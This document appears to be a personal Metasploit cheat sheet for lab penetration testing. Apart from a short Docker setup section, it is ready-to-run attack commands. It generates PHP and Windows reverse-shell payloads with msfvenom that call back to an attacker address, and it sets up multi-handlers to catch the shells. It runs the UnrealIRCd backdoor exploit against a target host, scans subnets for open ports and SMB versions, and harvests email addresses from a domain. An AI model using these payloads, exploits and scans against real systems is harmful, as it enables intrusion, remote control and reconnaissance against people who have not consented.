#### 1. About

- URL: `github.com/rapid7/metasploit-framework`
- metasploit framework


#### 2. Setup and run

Install:
```
# docker pull metasploitframework/metasploit-framework
# docker tag metasploitframework/metasploit-framework:latest msf
```

Expose ports on specific IP address and run:
```
# ip=`ip a | grep tun0 | grep inet | awk '{print $2}' | sed 's/\/.*//g'`
# docker run --name msf -e ip=$ip -v /tmp:/tmp -p 4000-4010:4000-4010 -d --rm -it msf
```

Bash profile aliases (`~/.bash_aliases` or `~/.profile`):
```
# [[ -z `grep masfvenom ~/.profile` ]] && echo 'alias msfvenom="docker exec -it msf /usr/src/metasploit-framework/msfvenom"' >> ~/.profile
# [[ -z `grep msfconsole ~/.profile` ]] && echo 'alias msfconsole="docker exec -it msf /usr/src/metasploit-framework/msfconsole"' >> ~/.profile
```


#### 3. Example 1
```
# msfvenom -p php/meterpreter/reverse_tcp LHOST=$ip LPORT=4001 R -o /tmp/msf/payload.php
# cat << EOF > /tmp/shell.rc
use exploit/multi/handler
set PAYLOAD php/meterpreter/reverse_tcp
set LHOST 10.10.10.10
set LPORT 4001
exploit
EOF
# msfconsole -qr /tmp/shell.rc
```


#### 4. Example 2
```
# cat << EOF > /tmp/exploit.rc
use exploit/unix/irc/unreal_ircd_3281_backdoor
set RHOSTS 10.10.10.11
set RPORT 6697
set PAYLOAD cmd/unix/reverse
set LHOST 10.10.10.10
set LPORT 4001
exploit
EOF
# msfconsole -qr /tmp/exploit.rc
```


#### 5. Example 3 (custom exploit)
```
# docker run --name msf -v /tmp:/tmp -p 4000-4010:4000-4010 -d --rm -it msf
# msfvenom -p windows/shell_reverse_tcp LHOST=172.16.201.160 LPORT=4001 EXITFUNC=thread -b '\x00\x0a\x0d' -f python -v buffer
# cat << EOF > /tmp/handler.rc
use exploit/multi/handler
set PAYLOAD windows/shell_reverse_tcp
set EXITFUNC thread
set LHOST 10.10.10.11
set LPORT 4001
exploit
EOF
# msfconsole -qr /tmp/handler.rc
```


#### 6. Multi-handler and listeners for both x86 / x64

a) Payloads
```
# msfvenom -p windows/x64/shell/reverse_tcp -f raw -o /tmp/x64_rev_shell.exe EXITFUNC=thread LHOST=10.11.0.232 LPORT=6666
# msfvenom -p windows/shell/reverse_tcp -f raw -o /tmp/x86_rev_shell.exe EXITFUNC=thread LHOST=10.11.0.232 LPORT=5555
```

b) Listeners:
```
# cat << EOF > handler.cfg
use exploit/multi/handler
set LHOST 10.10.10.11
set ExitOnSession false
set EXITFUNC thread
set PAYLOAD windows/x64/shell/reverse_tcp
set LPORT 6666
exploit -j
set PAYLOAD windows/shell/reverse_tcp
set LPORT 5555
exploit -j
EOF
# /etc/init.d/postgresql start
# msfconsole -qr handler.cfg
```


#### 7. Port scanning

a) SYN scan
```
# q="use auxiliary/scanner/portscan/syn; \
   set INTERFACE tap0; \
   set PORTS 80; \
   set RHOSTS 10.11.1.*; \
   set THREADS 10; \
   run; exit y \
"
# msfconsole -qx "$q"
```

b) TCP scan
```
# q="use auxiliary/scanner/portscan/tcp; \
   set RHOSTS 10.11.1.*; \
   set PORTS 80; \
   set THREADS 5; \
   run; exit y \
"
# msfconsole -qx "$q"
```

c) SMB scan
```
# q="use auxiliary/scanner/smb/smb_version; \
   set RHOSTS 10.11.1.*; \
   set THREADS 11; \
   run; exit y \
"
# msfconsole -qx "$q"
```

d) Find idle boxes for zobie scan
```
# q="use auxiliary/scanner/ip/ipidseq; \
   set RHOSTS 10.11.1.*; \
   set THREADS 11; \
   run; exit y \
"
# msfconsole -qx "$q"
```


#### 8. Enumeration

a) Find emails on domain
```
# domain='example.com'
# q="use auxiliary/gather/search_email_collector; set DOMAIN $domain; run; exit y"
# msfconsole -qx "$q" | grep -oE "[-0-9a-zA-Z_]{1,}@$domain"
email@example.com
user@example.com
```


#### 9. MSF Database Cache
```
# systemctl start postgresql
# msfdb init
msf > db_status
msf > db_rebuild_cache
```
